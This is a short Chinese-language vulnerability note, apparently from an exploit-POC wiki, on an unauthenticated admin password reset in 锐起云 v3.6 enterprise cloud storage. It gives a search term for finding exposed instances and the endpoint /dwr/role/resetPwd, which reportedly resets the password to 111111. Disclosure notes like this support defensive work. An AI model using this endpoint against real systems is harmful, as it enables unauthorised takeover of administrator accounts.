# 锐起云 resetPwd 登陆绕过漏洞

## 漏洞描述

锐起云是一款企业私有云，旨在帮助企业建立私有云存储和管理系统，帮助企业实现集中管理文档、强化数据安全、打造信息互通、数据驱动的协同办公环境。提升工作效率的同时，使数据真正为企业掌控，全程不改变用户操作习惯，是全新一代企业云盘的代表。锐起云存在前台未授权修改密码登陆后台漏洞,攻击者可以通过访问特定接口重置管理员密码。

## 漏洞影响

<a-checkbox checked>锐起云 v3.6</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"锐起云"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1692239495468-467f771d-6d80-4a09-b9a0-b2bfd3f617ab-20231108133448879.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/2117730/1692239627760-f17c0c2f-c561-4754-9aee-637e3fb7a5eb.png)

验证POC, 重置密码为 111111

```plain
/dwr/role/resetPwd
```

![img](../../../.vuepress/public/img/1692239612129-491c8b3f-020c-4b72-b9d4-c547f6e681eb.png)